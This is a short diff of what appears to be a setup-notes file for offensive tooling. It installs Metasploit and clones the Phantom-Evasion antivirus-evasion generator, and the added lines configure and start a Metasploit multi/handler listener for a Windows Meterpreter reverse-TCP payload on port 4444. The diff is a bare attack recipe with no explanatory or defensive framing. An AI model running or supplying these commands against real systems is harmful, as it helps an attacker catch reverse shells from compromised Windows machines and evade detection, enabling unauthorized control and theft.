@@ -7,6 +7,12 @@ chmod +x msfinstall
 sudo ./msfinstall
 msfconsole
 msfdb init
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.1
+set lport 4444
+run
 
 git clone https://github.com/oddcod3/Phantom-Evasion.git
 chmod +x ./phantom-evasion.py
